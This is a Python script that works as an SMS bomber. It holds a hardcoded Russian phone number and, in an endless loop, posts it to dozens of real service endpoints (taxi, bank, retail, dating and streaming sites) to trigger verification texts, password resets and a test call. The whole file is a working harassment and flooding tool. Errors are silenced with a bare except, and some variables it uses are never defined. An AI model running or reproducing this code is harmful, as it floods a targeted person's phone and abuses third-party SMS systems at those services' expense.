import requests
import random

print(requests.post('https://avtobzvon.ru/request/makeTestCall?to=(967)%2246-46-82'))

heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
HEADERS = random.choice(heads)

phone = '89672464682'
iteration = 0
_name = 'lohotronimus'
_email = _name+f'{iteration}'+'@gmail.com'
email = _name+f'{iteration}'+'@gmail.com'
_phone = phone
formatted_phone = phone
_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
while True:
	try:
		print('lol')
		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9})
		requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={HEADERS})
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={HEADERS})
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
		requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
		requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
		requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
		requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 967 2464682','g-recaptcha-response': '','recaptcha': 'on'})
		requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + formatted_phone})
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + formatted_phone})
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + formatted_phone, "api": 2, "email": "email","x-email": "x-email"})		
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + formatted_phone})
		requests.post('https://plink.tech/register/',json={"phone": formatted_phone})
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": formatted_phone})
		requests.post("http://smsgorod.ru/sendsms.php",data={"number": formatted_phone})
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': formatted_phone})
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": formatted_phone,"username": username})
		requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': formatted_phone},headers={'App-ID': 'cabinet'})
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": formatted_phone, "type": 2})
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + formatted_phone})
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": formatted_phone})
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": formatted_phone})
		requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': formatted_phone})
		requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": formatted_phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
		requests.get('https://findclone.ru/register', params={'phone': '+' + formatted_phone})
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + formatted_phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
		requests.post('https://youdo.com/api/verification/sendverificationcode/', data={'PhoneE164':_phone})
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": 'Porno22!', "application": "lkp", "login": "+" + _phone})
		requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': _phone})
		print(iteration)
		iteration += 1
	except:
		pass